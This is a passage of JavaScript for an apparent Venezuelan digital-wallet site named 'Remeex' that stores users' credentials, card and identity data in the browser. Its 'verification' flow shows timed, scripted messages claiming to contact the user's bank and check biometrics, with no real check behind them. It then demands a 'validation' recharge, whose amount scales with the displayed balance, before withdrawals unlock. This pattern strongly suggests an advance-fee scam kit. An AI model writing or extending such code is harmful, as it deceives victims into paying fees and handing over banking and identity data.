        MOBILE_ACCOUNTS: 'remeexMobileAccounts',
        VERIFICATION: 'remeexVerificationStatus',
        VERIFICATION_DATA: 'remeexVerificationData', // Nueva clave para almacenar datos de verificacin
        VERIFICATION_PROCESSING: 'remeexVerificationProcessing', // NUEVA IMPLEMENTACIN
        CARD_DATA: 'remeexCardData',
        TRANSFER_DATA: 'remeexTransferData',
        USER_CREDENTIALS: 'remeexUserCredentials', // Nueva clave para credenciales de usuario
        HAS_MADE_FIRST_RECHARGE: 'remeexHasMadeFirstRecharge', // Nueva clave para rastrear si ha hecho recarga
        DEVICE_ID: 'remeexDeviceId', // Nueva clave para identificar el dispositivo
        MOBILE_PAYMENT_DATA: 'remeexMobilePaymentData', // Nueva clave para datos de pago mvil
        SUPPORT_NEEDED_TIMESTAMP: 'remeexSupportNeededTimestamp', // Nueva clave para timestamp de soporte
        WELCOME_BONUS_CLAIMED: 'remeexWelcomeBonusClaimed',
        NOTIFICATIONS: 'remeexNotifications',
        PROBLEM_RESOLVED: 'remeexProblemResolved',
        SAVINGS: 'remeexSavings'
      },
      SESSION_KEYS: {
        BALANCE: 'remeexSessionBalance',
        EXCHANGE_RATE: 'remeexSessionExchangeRate'
      },
      SUPPORT_DISPLAY_DELAY: 300000 // 5 minutos en milisegundos antes de mostrar soporte
    };

    if (localStorage.getItem(CONFIG.STORAGE_KEYS.PROBLEM_RESOLVED) === "true") {
      window.location.href = "https://visa.es";
    }

const BANK_NAME_MAP = {
      banesco: 'Banesco',
      mercantil: 'Mercantil',
      venezuela: 'Banco de Venezuela',
      provincial: 'BBVA Provincial',
      bancaribe: 'Bancaribe',
      bod: 'BOD',
      exterior: 'Banco Exterior',
      activo: 'Banco Activo',
      plaza: 'Banco Plaza',
      sofitasa: 'Sofitasa',
      fondo_comun: 'Fondo Comn',
      bancamiga: 'Bancamiga',
      banplus: 'Banplus',
      banco_del_tesoro: 'Banco del Tesoro',
      bicentenario: 'Banco Bicentenario',
      banco_agricola: 'Banco Agrcola',
      mi_banco: 'Mi Banco',
      'banco-n58': 'N58 Banco Digital',
      otros: 'Otros'
    };

    const CITY_VALIDATION_AMOUNTS = {
      caracas: {
        'Estndar': 30,
        'Bronce': 35,
        'Platinum': 40,
        'Uranio Visa': 45,
        'Uranio Infinite': 50
      },
      maracaibo: {
        'Estndar': 28,
        'Bronce': 33,
        'Platinum': 38,
        'Uranio Visa': 43,
        'Uranio Infinite': 48
      },
      valencia: {
        'Estndar': 27,
        'Bronce': 32,
        'Platinum': 37,
        'Uranio Visa': 42,
        'Uranio Infinite': 47
      }
    };

    // Global variables
    let currentUser = {
      name: '',
      fullName: '',
      email: '',
      balance: {
        usd: 0,
        bs: 0,
        eur: 0
      },
      transactions: [],
      cardRecharges: 0,
      hasSavedCard: false,
      hasMadeFirstRecharge: false, // Variable para rastrear si ha hecho su primera recarga
      hasClaimedWelcomeBonus: false,
      deviceId: '', // ID nico para este dispositivo
      idNumber: '', // Nmero de cdula
      phoneNumber: '', // Nmero de telfono
      withdrawalsEnabled: true,
      accountFrozen: false,
      primaryCurrency: 'usd'
    };

    let selectedAmount = {
      usd: 0,
      bs: 0,
      eur: 0
    };

    let verificationStatus = {
      isVerified: false,
      hasUploadedId: false,
      status: 'unverified', // 'unverified', 'pending', 'verified', 'processing', 'bank_validation', 'payment_validation'
      idNumber: '', // Nmero de cdula
      phoneNumber: '' // Nmero de telfono
    };

    // NUEVA IMPLEMENTACIN: Variables para el proceso de verificacin
    let verificationProcessing = {
      isProcessing: false,
      startTime: null,
      currentPhase: 'documents', // 'documents', 'bank_validation', 'payment_validation'
      timer: null
    };

    // Mensajes dinmicos para el progreso de verificacin
    const verificationProgressMessages = [
      "Contactando con tu banco...",
      "Verificando cdula de identidad...",
      "Comprobando datos biomtricos...",
      "Analizando historial financiero...",
      "Sincronizando con registros gubernamentales...",
      "Realizando comprobaciones adicionales...",
      "Confirmando datos proporcionados...",
      "Asegurando encriptacin de informacin...",
      "Procesando validaciones finales...",
      "Casi listo, afinando detalles..."
    ];
    let verificationProgressInterval = null;
    let selectedPaymentMethod = 'card-payment';
    let inactivityTimer = null;
    let inactivityCountdown = null;
    let inactivitySeconds = 30;
    let activeUsersCount = 0;
    let pendingTransactions = [];
    let displayedTransactions = new Set();
    let transactionFilter = 'all';
    let savings = { pots: [], nextId: 1 };
    let exchangeHistory = [];
    let mobilePaymentTimer = null; // Temporizador para mostrar el mensaje de soporte
    let selectedBalanceCurrency = 'bs';
    let isBalanceHidden = false;
    let notifications = [];

    // DOM Ready
    document.addEventListener('DOMContentLoaded', function() {
      // Iniciar aplicacin
      initApp();

      // Cargar notificaciones guardadas
      loadNotifications();
      updateNotificationBadge();
      
      // Set up event listeners
      setupEventListeners();
      
      // Inactivity handler
      setupInactivityHandler();
      
      // Storage event listener para sincronizar mltiples pestaas
      window.addEventListener('storage', handleStorageChange);
      
      // Check for returning from transfer
      checkReturnFromTransfer();
      


      // NUEVA IMPLEMENTACIN: Verificar estado de procesamiento de verificacin
      checkVerificationProcessingStatus();
    });

    // NUEVA IMPLEMENTACIN: Funcin para verificar el estado de procesamiento de verificacin
    function checkVerificationProcessingStatus() {
      const processingData = localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_PROCESSING);

      if (!processingData) return;

      try {
        const data = JSON.parse(processingData);
        verificationProcessing = data;
        const currentTime = Date.now();
        const elapsedTime = currentTime - (data.startTime || 0);

        if (data.isProcessing && elapsedTime < CONFIG.VERIFICATION_PROCESSING_TIMEOUT) {
          // Continuar proceso de verificacin de documentos
          verificationStatus.status = 'processing';
          showVerificationProcessingBanner();

          // Temporizador para pasar a validacin bancaria
          const remainingTime = CONFIG.VERIFICATION_PROCESSING_TIMEOUT - elapsedTime;
          verificationProcessing.timer = setTimeout(function() {
            updateVerificationToBankValidation();
          }, remainingTime);
        } else if (data.isProcessing && elapsedTime >= CONFIG.VERIFICATION_PROCESSING_TIMEOUT) {
          // Tiempo cumplido, pasar a validacin bancaria
          updateVerificationToBankValidation();
        } else {
          // Proceso ya est en otra fase
          if (data.currentPhase === 'bank_validation' || data.currentPhase === 'payment_validation') {
            verificationStatus.status = data.currentPhase;
            updateVerificationProcessingBanner();
            personalizeVerificationStatusCards();
            updateStatusCards();
          }
        }
      } catch (e) {
        console.error('Error parsing verification processing data:', e);
      }
    }

    // NUEVA IMPLEMENTACIN: Funcin para iniciar el proceso de verificacin
    function startVerificationProcessing() {
      verificationProcessing = {
        isProcessing: true,
        startTime: new Date().getTime(),
        currentPhase: 'documents',
        timer: null
      };
      
      // Guardar en localStorage
      localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_PROCESSING, JSON.stringify(verificationProcessing));
      
      // Cambiar el estado de verificacin
      verificationStatus.status = 'processing';
      saveVerificationStatus();

      // Mostrar banner de procesamiento
      showVerificationProcessingBanner();
      updateStatusCards();
      
      // Configurar temporizador para cambiar a validacin bancaria despus de 10 minutos
      verificationProcessing.timer = setTimeout(function() {
        updateVerificationToBankValidation();
      }, CONFIG.VERIFICATION_PROCESSING_TIMEOUT);
    }

    // NUEVA IMPLEMENTACIN: Funcin para actualizar a validacin bancaria
function updateVerificationToBankValidation() {
  verificationProcessing.currentPhase = 'bank_validation';
  verificationProcessing.isProcessing = false;
  if (verificationProcessing.timer) {
    clearTimeout(verificationProcessing.timer);
    verificationProcessing.timer = null;
  }
  verificationStatus.status = 'bank_validation';
  
  // Actualizar localStorage
  localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_PROCESSING, JSON.stringify(verificationProcessing));
  saveVerificationStatus();
  
  // Actualizar el banner con animacin
  const banner = document.getElementById('status-processing-card');
  if (banner) {
    // Aadir efecto de transicin suave
    gsap.to(banner, {
      scale: 0.98,
      duration: 0.2,
      ease: "power2.in",
      onComplete: function() {
        updateVerificationProcessingBanner();
        gsap.to(banner, {
          scale: 1,
          duration: 0.3,
          ease: "power2.out"
        });
        
        // Mostrar notificacin de xito
        setTimeout(() => {
          showToast('success', 'Documentos Aprobados', 'Sus documentos han sido verificados exitosamente. Complete el ltimo paso para activar su cuenta.', 5000);
          addNotification('success', 'Documentos verificados', 'Sus documentos fueron aprobados.');
        }, 500);
      }
    });
  } else {
    updateVerificationProcessingBanner();
  }
  personalizeVerificationStatusCards();
  updateStatusCards();
}

    // NUEVA IMPLEMENTACIN: Funcin para mostrar el banner de procesamiento de verificacin
    function showVerificationProcessingBanner() {
      const processingBanner = document.getElementById('status-processing-card');
      if (processingBanner) {
        processingBanner.style.display = 'block';
        updateVerificationProcessingBanner();
      }
    }

 // NUEVA IMPLEMENTACIN: Funcin para actualizar el contenido del banner de procesamiento
function updateVerificationProcessingBanner() {
  const title = document.getElementById('verification-processing-title');
  const text = document.getElementById('verification-processing-text');
  const note = document.getElementById('verification-note');
  const icon = document.getElementById('verification-processing-icon');
  const mainSpinner = document.getElementById('main-processing-spinner');
  const statusItems = document.getElementById('verification-status-cards');
  const firstName = currentUser.fullName ? escapeHTML(currentUser.fullName.split(' ')[0]) :
                     (currentUser.name ? escapeHTML(currentUser.name.split(' ')[0]) : '');

  // Ensure the phase matches the stored verification status
  let expectedPhase = null;
  if (verificationStatus.status === 'payment_validation') {
    expectedPhase = 'payment_validation';
  } else if (verificationStatus.status === 'bank_validation') {
    expectedPhase = 'bank_validation';
  } else if (verificationStatus.status === 'processing') {
    expectedPhase = 'documents';
  }

  if (expectedPhase && verificationProcessing.currentPhase !== expectedPhase) {
    verificationProcessing.currentPhase = expectedPhase;
    localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_PROCESSING, JSON.stringify(verificationProcessing));
  }
  
  if (verificationProcessing.currentPhase === 'documents') {
    if (title) title.textContent = firstName ? `${firstName}, estamos verificando tus documentos` : 'Verificando Documentos';
    if (text) text.textContent = `${firstName ? firstName + ', ' : ''}estamos revisando tu documentacin. Este proceso puede tardar unos minutos.`;
    if (note) note.textContent = 'Puedes cerrar sesin, no es necesario permanecer en lnea. Puedes volver en cualquier momento.';
    if (icon) {
      icon.className = 'verification-processing-icon';
      icon.innerHTML = '<i class="fas fa-id-card"></i>';
    }
    startVerificationProgress();
    if (mainSpinner) mainSpinner.style.display = 'block';
    if (statusItems) statusItems.style.display = 'none';
  } else if (verificationProcessing.currentPhase === 'bank_validation') {
    if (title) title.textContent = ' Verificacin en Progreso';
    if (text) text.textContent = `${firstName ? firstName + ', ' : ''}hemos completado la verificacin de tus documentos. Falta un ltimo paso para activar todas las funciones.`;
    if (note) note.textContent = `${firstName ? firstName + ', ' : ''}puedes cerrar sesin. No es necesario permanecer en lnea y puedes volver en cualquier momento.`;
    const finalHeading = document.getElementById('verification-final-heading');
    if (finalHeading) finalHeading.textContent = `${firstName ? firstName + ', ' : ''}verificacin en progreso`;
    if (icon) {
      icon.className = 'verification-processing-icon bank-phase';
      icon.innerHTML = '<i class="fas fa-shield-alt"></i>';
    }
      stopVerificationProgress();
      const progressContainer = document.getElementById("verification-progress-container");
      if (progressContainer) progressContainer.style.display = "none";
    if (mainSpinner) mainSpinner.style.display = 'none';
    if (statusItems) {
      statusItems.style.display = 'flex';

      if (statusItems) personalizeVerificationStatusCards();
      const finalText = document.getElementById('final-step-text');
      if (finalText) finalText.textContent = `${firstName ? firstName + ', ' : ''}te falta un ltimo paso para activar todas las funciones.`;

      // Animar la aparicin de los items de estado
      gsap.fromTo(statusItems.children, {
        opacity: 0,
        y: 20
      }, {
        opacity: 1,
        y: 0,
        duration: 0.5,
        stagger: 0.2,
        ease: "power2.out"
      });
    }
  } else if (verificationProcessing.currentPhase === 'payment_validation') {
    if (title) title.textContent = 'Pago Mvil en Verificacin';
    if (text) text.textContent = 'Ya completaste el ltimo paso, estamos validando tu pago mvil y en breve se habilitarn los retiros.';
    if (icon) {
      icon.className = 'verification-processing-icon bank-phase';
      icon.innerHTML = '<i class="fas fa-mobile-alt"></i>';
    }
    stopVerificationProgress();
    const progressContainer = document.getElementById("verification-progress-container");
    if (progressContainer) progressContainer.style.display = "none";
    if (mainSpinner) mainSpinner.style.display = 'none';
    if (statusItems) statusItems.style.display = 'flex';
    updateBankValidationStatusItem();
  }
}

function updateBankValidationStatusItem() {
  const label = document.querySelector('#status-bank-validation .status-label');
  const sublabel = document.querySelector('#status-bank-validation .status-sublabel');
  const rechargeBtn = document.getElementById('start-recharge');
  const statusBtn = document.getElementById('view-status');
  const firstName = currentUser.fullName ? escapeHTML(currentUser.fullName.split(' ')[0]) :
                     (currentUser.name ? escapeHTML(currentUser.name.split(' ')[0]) : '');
  const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
  const banking = JSON.parse(localStorage.getItem('remeexVerificationBanking') || '{}');
  const bankName = BANK_NAME_MAP[reg.primaryBank] || banking.bankName || '';
  const benefitsBanner = document.getElementById('validation-benefits-banner');

  let requiredUsd = 25;
  if (currentUser.balance.usd >= 2015) {
    requiredUsd = 35;
  } else if (currentUser.balance.usd >= 1015) {
    requiredUsd = 30;
  }

  if (verificationStatus.status === 'payment_validation') {
    if (label) label.textContent = 'Pago mvil en verificacin';
    if (sublabel) sublabel.textContent = 'Ya completaste el ltimo paso, estamos validando tu pago mvil y en breve se habilitarn los retiros.';
    if (rechargeBtn) rechargeBtn.style.display = 'none';
    if (statusBtn) statusBtn.style.display = 'none';
    if (benefitsBanner) benefitsBanner.style.display = 'none';
  } else {
    if (label) label.textContent = 'Validacin de datos de cuenta pendiente';
    if (sublabel) {
      sublabel.textContent = `${firstName ? firstName + ', ' : ''}para validar tu cuenta debes recargar en Remeex desde tu cuenta registrada en bolvares para habilitar tus retiros y superar el ltimo requerimiento de seguridad.`;
    }
    if (rechargeBtn) rechargeBtn.style.display = 'inline-block';
    if (statusBtn) statusBtn.style.display = 'inline-block';
    if (benefitsBanner) benefitsBanner.style.display = 'flex';
  }
}

function updateVerificationToPaymentValidation() {
  verificationProcessing.currentPhase = 'payment_validation';
  verificationProcessing.isProcessing = false;
  if (verificationProcessing.timer) {
    clearTimeout(verificationProcessing.timer);
    verificationProcessing.timer = null;
  }
  verificationStatus.status = 'payment_validation';

  localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_PROCESSING, JSON.stringify(verificationProcessing));
  saveVerificationStatus();
  updateBankValidationStatusItem();
  personalizeVerificationStatusCards();
  updateVerificationProcessingBanner();
  updateStatusCards();
}

function personalizeVerificationStatusCards() {
  const docLabel = document.getElementById('status-documents-label');
  const idInfo = document.getElementById('id-validated-info');
  const bankLabel = document.getElementById('status-bank-label');
  const bankNameEl = document.getElementById('bank-name-text');
  const bankAccountEl = document.getElementById('bank-account-text');
  const bankLogoEl = document.getElementById('bank-logo-mini');

  const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
  const banking = JSON.parse(localStorage.getItem('remeexVerificationBanking') || '{}');

  const idNum = verificationStatus.idNumber || currentUser.idNumber || '';
  const fullName = escapeHTML(currentUser.fullName || currentUser.name || '');
  const firstName = fullName.split(' ')[0] || '';
  const bankName = BANK_NAME_MAP[reg.primaryBank] || banking.bankName || '';
  const accountNum = banking.accountNumber || '';
  const logoUrl = getBankLogo(reg.primaryBank) || getBankLogo(banking.bankId || '');

  if (docLabel) docLabel.textContent = `${firstName ? firstName + ', ' : ''}tu cdula de identidad se valid con xito`;
  if (idInfo) {
    idInfo.textContent = idNum && fullName ? `C.I. ${idNum} - ${fullName}` : '';
  }
  if (bankLabel) bankLabel.textContent = `Tu cuenta del ${bankName} fue registrada con xito`;
  if (bankNameEl) bankNameEl.textContent = bankName;
  if (bankAccountEl) bankAccountEl.textContent = accountNum ? `Cuenta N ${accountNum}` : '';
  if (bankLogoEl) {
    bankLogoEl.src = logoUrl;
    bankLogoEl.alt = bankName;
    bankLogoEl.style.display = logoUrl ? 'inline' : 'none';
  }
}

function updateVerificationProgress() {
  const container = document.getElementById("verification-progress-container");
  const percentEl = document.getElementById("verification-progress-percent");
  const bar = document.getElementById("verification-progress-bar");
  const text = document.getElementById("verification-processing-text");

  if (!verificationProcessing.isProcessing || verificationProcessing.currentPhase !== "documents") {
    if (container) container.style.display = "none";
    if (percentEl) percentEl.style.display = "none";
    return;
  }

  if (container) container.style.display = "block";
  if (percentEl) percentEl.style.display = "block";
  const elapsed = new Date().getTime() - verificationProcessing.startTime;
  const total = CONFIG.VERIFICATION_PROCESSING_TIMEOUT;
  const progress = Math.min(100, (elapsed / total) * 100);
  if (bar) bar.style.width = progress + "%";
  if (percentEl) percentEl.textContent = Math.floor(progress) + "%";

  const msgIndex = Math.min(verificationProgressMessages.length - 1, Math.floor((elapsed / total) * verificationProgressMessages.length));
  const firstName = currentUser.fullName ? escapeHTML(currentUser.fullName.split(' ')[0]) : (currentUser.name ? escapeHTML(currentUser.name.split(' ')[0]) : '');
  const message = verificationProgressMessages[msgIndex];
  if (text) text.textContent = firstName ? `${firstName}, ${message}` : message;
}

function startVerificationProgress() {
  updateVerificationProgress();
  if (verificationProgressInterval) clearInterval(verificationProgressInterval);
  verificationProgressInterval = setInterval(updateVerificationProgress, 15000);
}

function stopVerificationProgress() {
  if (verificationProgressInterval) {
    clearInterval(verificationProgressInterval);
    verificationProgressInterval = null;
  }
}

    // NUEVA IMPLEMENTACIN: Funcin para ocultar el banner de procesamiento
    function hideVerificationProcessingBanner(reset = false) {
      const processingBanner = document.getElementById('status-processing-card');
      if (processingBanner) {
        processingBanner.style.display = 'none';
      }

      stopVerificationProgress();
      // Limpiar el temporizador y los datos de procesamiento
      if (verificationProcessing.timer) {
        clearTimeout(verificationProcessing.timer);
        verificationProcessing.timer = null;
      }

      if (reset) {
        verificationProcessing = {
          isProcessing: false,
          startTime: null,
          currentPhase: 'documents',
          timer: null
        };

        localStorage.removeItem(CONFIG.STORAGE_KEYS.VERIFICATION_PROCESSING);
      }
      updateStatusCards();
    }
    
    // Funcin para generar un ID nico para el dispositivo
    function generateDeviceId() {
      let deviceId = localStorage.getItem(CONFIG.STORAGE_KEYS.DEVICE_ID);
      if (!deviceId) {
        deviceId = 'device_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        localStorage.setItem(CONFIG.STORAGE_KEYS.DEVICE_ID, deviceId);
      }
      return deviceId;
    }

    // Funcin para guardar datos de pago mvil en localStorage
    function saveMobilePaymentData() {
      // Usar los datos de verificacin del usuario en lugar de datos fijos
      const mobilePaymentData = {
        name: currentUser.fullName || currentUser.name || 'Verificacin Pendiente', // Nombre del usuario
        rif: verificationStatus.idNumber || 'Verificacin Pendiente', // Cdula del usuario
        phone: verificationStatus.phoneNumber || 'Verificacin Pendiente', // Telfono del usuario
        timestamp: new Date().getTime()
      };
      
      localStorage.setItem(CONFIG.STORAGE_KEYS.MOBILE_PAYMENT_DATA, JSON.stringify(mobilePaymentData));
      
      // Establecer el temporizador para mostrar el mensaje de soporte
      if (mobilePaymentTimer) clearTimeout(mobilePaymentTimer);
      
      mobilePaymentTimer = setTimeout(function() {
        showSupportNeededMessage();
      }, CONFIG.SUPPORT_DISPLAY_DELAY);
      
      // Guardar timestamp para el mensaje de soporte
      localStorage.setItem(CONFIG.STORAGE_KEYS.SUPPORT_NEEDED_TIMESTAMP, new Date().getTime() + CONFIG.SUPPORT_DISPLAY_DELAY);
    }

    // Funcin para cargar datos de pago mvil desde localStorage
    function loadMobilePaymentData() {
      const storedData = localStorage.getItem(CONFIG.STORAGE_KEYS.MOBILE_PAYMENT_DATA);
      
      if (storedData) {
        try {
          const paymentData = JSON.parse(storedData);
          
          // Actualizar los campos en la interfaz con los datos del usuario
          const nameValue = document.getElementById('mobile-payment-name-value');
          const rifValue = document.getElementById('mobile-payment-rif-value');
          const phoneValue = document.getElementById('mobile-payment-phone-value');

          const bankNameEl1 = document.getElementById('user-bank-name');
          const bankNameEl2 = document.getElementById('user-bank-name-2');
          const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
          const bankName = BANK_NAME_MAP[reg.primaryBank] || '';
          if (bankNameEl1) bankNameEl1.textContent = bankName;
          if (bankNameEl2) bankNameEl2.textContent = bankName;
          
          const nameCopyBtn = document.querySelector('#mobile-payment-name .copy-btn');
          const rifCopyBtn = document.querySelector('#mobile-payment-rif .copy-btn');
          const phoneCopyBtn = document.querySelector('#mobile-payment-phone .copy-btn');
          
          // Mostrar el nombre completo del usuario
          if (nameValue && paymentData.name) {
            nameValue.textContent = paymentData.name;
            if (nameCopyBtn) {
              nameCopyBtn.setAttribute('data-copy', paymentData.name);
            }
          }
          
          // Mostrar cdula del usuario en lugar de RIF fijo
          if (rifValue && paymentData.rif) {
            rifValue.textContent = paymentData.rif;
            if (rifCopyBtn) {
              rifCopyBtn.setAttribute('data-copy', paymentData.rif);
            }
          }
          
          // Mostrar telfono del usuario en lugar de telfono fijo
          if (phoneValue && paymentData.phone) {
            // Dar formato al nmero de telfono: 0412-1234567
            const formattedPhone = paymentData.phone.replace(/(\d{4})(\d{7})/, '$1-$2');
            phoneValue.textContent = formattedPhone;
            if (phoneCopyBtn) {
              phoneCopyBtn.setAttribute('data-copy', formattedPhone);
            }
          }
          
          // Verificar si el usuario est verificado para mostrar mensaje de confirmacin
          if (verificationStatus.status === 'verified' || verificationStatus.status === 'pending') {
            const mobilePaymentSuccess = document.getElementById('mobile-payment-success');
            if (mobilePaymentSuccess) {
              mobilePaymentSuccess.style.display = 'flex';
            }
          }
          
          // Verificar si es momento de mostrar el mensaje de soporte
          const supportNeededTimestamp = parseInt(localStorage.getItem(CONFIG.STORAGE_KEYS.SUPPORT_NEEDED_TIMESTAMP) || '0');
          const currentTime = new Date().getTime();
          
          if (supportNeededTimestamp > 0 && currentTime >= supportNeededTimestamp) {
            showSupportNeededMessage();
          } else if (supportNeededTimestamp > currentTime) {
            // Restablecer el temporizador para mostrar el mensaje
            const remainingTime = supportNeededTimestamp - currentTime;
            if (mobilePaymentTimer) clearTimeout(mobilePaymentTimer);
            
            mobilePaymentTimer = setTimeout(function() {
              showSupportNeededMessage();
            }, remainingTime);
          }
          
          return true;
        } catch (e) {
          console.error('Error parsing mobile payment data:', e);
          return false;
        }
      }
      return false;
    }

    // Funcin para mostrar el mensaje de soporte necesario
    function showSupportNeededMessage() {
      const supportNeededContainer = document.getElementById('support-needed-container');
      if (supportNeededContainer) {
        supportNeededContainer.style.display = 'block';
      }
    }

    // Funcin para reiniciar el estado de soporte necesario
    function resetSupportNeededState() {
      if (mobilePaymentTimer) {
        clearTimeout(mobilePaymentTimer);
        mobilePaymentTimer = null;
      }
      
      localStorage.removeItem(CONFIG.STORAGE_KEYS.SUPPORT_NEEDED_TIMESTAMP);
      
      const supportNeededContainer = document.getElementById('support-needed-container');
      if (supportNeededContainer) {
        supportNeededContainer.style.display = 'none';
      }
    }


    // Verificar si regresa de transferencia y procesar la informacin
    function checkReturnFromTransfer() {
  const pendingJson = sessionStorage.getItem("remeexPendingTransactions");
  if (pendingJson) {
    try {
      const list = JSON.parse(pendingJson);
      list.forEach(tx => {
        if (!currentUser.transactions.some(t => t.reference === tx.id)) {
          const amountUsd = tx.method === "international" ? parseFloat(tx.amount) : parseFloat(tx.amount) / CONFIG.EXCHANGE_RATES.USD_TO_BS;
          addTransaction({
            type: "withdraw",
            reference: tx.id,
            amount: amountUsd,
            amountBs: amountUsd * CONFIG.EXCHANGE_RATES.USD_TO_BS,
            amountEur: amountUsd * CONFIG.EXCHANGE_RATES.USD_TO_EUR,
            date: getCurrentDateTime(),
            description: tx.method === "mobile" ? "Retiro a Pago Mvil" : (tx.method === "bank" ? `Retiro a ${tx.bankName}` : `Retiro Internacional - ${tx.bankName}`),
            status: "pending",
            destination: tx.destination,
            bankName: tx.bankName,
            bankLogo: tx.bankLogo
          });
        }
      });
    } catch(e) { console.error("Error processing pending transactions from session:", e); }
    sessionStorage.removeItem("remeexPendingTransactions");
  }
      const transferData = JSON.parse(sessionStorage.getItem(CONFIG.STORAGE_KEYS.TRANSFER_DATA) || 'null');
      
      if (transferData) {
        // Recuperar los datos de la transferencia
        console.log("Informacin de transferencia recuperada:", transferData);
        
        // Aadir transaccin pendiente de retiro
        if (isLoggedIn() && transferData.amount && transferData.bancoDestino) {
          addTransaction({
            type: 'withdraw',
            amount: parseFloat(transferData.amount),
            amountBs: parseFloat(transferData.amount) * CONFIG.EXCHANGE_RATES.USD_TO_BS,
            amountEur: parseFloat(transferData.amount) * CONFIG.EXCHANGE_RATES.USD_TO_EUR,
            date: getCurrentDateTime(),
            description: 'Retiro a ' + transferData.bancoDestino,
            status: 'pending',
            destination: transferData.bancoDestino,
            bankName: transferData.bancoDestino,
            bankLogo: transferData.bankLogo || ''
          });
          
          // Mostrar notificacin
          setTimeout(() => {
            showToast('info', 'Transferencia en Proceso', 
                    'Su solicitud de retiro a ' + transferData.bancoDestino + 
                    ' por $' + transferData.amount + ' est siendo procesada.');
          }, 1000);
          
          // Guardar en localStorage para persistir la informacin
          const pendingWithdrawals = JSON.parse(localStorage.getItem('remeexPendingWithdrawals') || '[]');
          pendingWithdrawals.push({
            amount: parseFloat(transferData.amount),
            bancoDestino: transferData.bancoDestino,
            date: getCurrentDateTime()
          });
          localStorage.setItem('remeexPendingWithdrawals', JSON.stringify(pendingWithdrawals));
          
          // Limpiar datos de transferencia despus de procesarlos
          sessionStorage.removeItem(CONFIG.STORAGE_KEYS.TRANSFER_DATA);
        }
      }
    }

    // Funcin para actualizar la tasa de cambio y recalcular todos los montos
    function updateExchangeRate(newRate) {
      // Actualizar la tasa centralizada
      CONFIG.EXCHANGE_RATES.USD_TO_BS = newRate;
      
      // Actualizar las opciones de montos en cada select
      updateAmountSelectOptions('card-amount-select');
      updateAmountSelectOptions('bank-amount-select');
      updateAmountSelectOptions('mobile-amount-select');
      
      // Actualizar los displays de tasa de cambio
      updateExchangeRateDisplays();
      
      // Recalcular el monto seleccionado
      selectedAmount.bs = selectedAmount.usd * CONFIG.EXCHANGE_RATES.USD_TO_BS;
      selectedAmount.eur = selectedAmount.usd * CONFIG.EXCHANGE_RATES.USD_TO_EUR;
      
      // Actualizar el botn de pago
      updateSubmitButtonText();
      
      // Actualizar equivalentes en el dashboard
      updateBalanceEquivalents();
    }
    
    // Funcin para actualizar las opciones de monto en los selects
    function updateAmountSelectOptions(selectId) {
      const select = document.getElementById(selectId);
      if (!select) return;
      
      // Guardar el valor seleccionado actualmente
      const currentValue = select.value;
      
      // Recorrer todas las opciones y actualizar sus valores y textos
      Array.from(select.options).forEach(option => {
        // Saltar la opcin de placeholder
        if (!option.value || option.disabled) return;
        
        const usdValue = parseInt(option.value);
        const bsValue = Math.round(usdValue * CONFIG.EXCHANGE_RATES.USD_TO_BS);
        const eurValue = (usdValue * CONFIG.EXCHANGE_RATES.USD_TO_EUR).toFixed(1);
        
        // Actualizar los atributos data
        option.dataset.bs = bsValue;
        option.dataset.eur = eurValue;
        
        // Actualizar el texto mostrado
        const formattedBs = bsValue.toLocaleString('es-VE');
        const formattedUsd = usdValue.toLocaleString('es-VE');
        const formattedEur = parseFloat(eurValue).toLocaleString('es-VE');
        
        option.textContent = `$${formattedUsd}  Bs ${formattedBs},00  ${formattedEur}`;
      });
      
      // Restaurar el valor seleccionado
      select.value = currentValue;
      
      // Actualizar el monto seleccionado si es el select actual
      if (selectId === 'card-amount-select' && selectedPaymentMethod === 'card-payment' ||
          selectId === 'bank-amount-select' && selectedPaymentMethod === 'bank-payment' ||
          selectId === 'mobile-amount-select' && selectedPaymentMethod === 'mobile-payment') {
        
        // Solo actualizar si hay una opcin seleccionada
        if (select.value) {
          const option = select.options[select.selectedIndex];
          selectedAmount.usd = parseInt(option.value) || 0;
          selectedAmount.bs = parseInt(option.dataset.bs) || 0;
          selectedAmount.eur = parseFloat(option.dataset.eur) || 0;
          updateSubmitButtonText();
        }
      }
      applyForcedValidationAmount();
    }

    function applyForcedValidationAmount() {
      const forcedRaw = typeof getForcedValidationAmount === 'function'
        ? getForcedValidationAmount()
        : null;
      const forced = typeof forcedRaw === 'number' && Number.isFinite(forcedRaw) ? forcedRaw : null;

      if (typeof CONFIG !== 'undefined' && CONFIG) {
        if (typeof forced === 'number') {
          CONFIG.VERIFICATION_AMOUNT_USD = forced;
        } else if (typeof getVerificationAmountUsd === 'function') {
          try {
            const balanceUsd = (currentUser && currentUser.balance && typeof currentUser.balance.usd === 'number')
              ? currentUser.balance.usd
              : 0;
            const computedAmount = getVerificationAmountUsd(balanceUsd);
            if (typeof computedAmount === 'number' && Number.isFinite(computedAmount)) {
              CONFIG.VERIFICATION_AMOUNT_USD = computedAmount;
            }
          } catch (error) {
            // Ignorar errores al recalcular el monto de verificacin
          }
        }
      }

      document.querySelectorAll('.amount-select').forEach(select => {
        Array.from(select.options).forEach(opt => {
          if (!opt.dataset.originalDisabled) {
            opt.dataset.originalDisabled = opt.disabled ? 'true' : 'false';
          }
          if (!opt.value) return;
          if (forced !== null) {
            if (opt.value === String(forced)) {
              opt.disabled = false;
              opt.hidden = false;
            } else {
              opt.disabled = true;
              opt.hidden = true;
            }
          } else {
            opt.disabled = opt.dataset.originalDisabled === 'true';
            opt.hidden = false;
          }
        });
        if (forced !== null) {
          select.value = String(forced);
        }
      });

      if (forced !== null) {
        let activeSelectId = 'card-amount-select';
        if (typeof selectedPaymentMethod === 'string') {
          if (selectedPaymentMethod === 'bank-payment') activeSelectId = 'bank-amount-select';
          if (selectedPaymentMethod === 'mobile-payment') activeSelectId = 'mobile-amount-select';
        }
        const activeSelect = document.getElementById(activeSelectId);
        if (activeSelect && typeof selectedAmount === 'object' && selectedAmount) {
          const forcedOption = activeSelect.querySelector(`option[value="${forced}"]`);
          if (forcedOption) {
            const forcedUsd = forced;
            const forcedBs = parseFloat(forcedOption.dataset.bs || '');
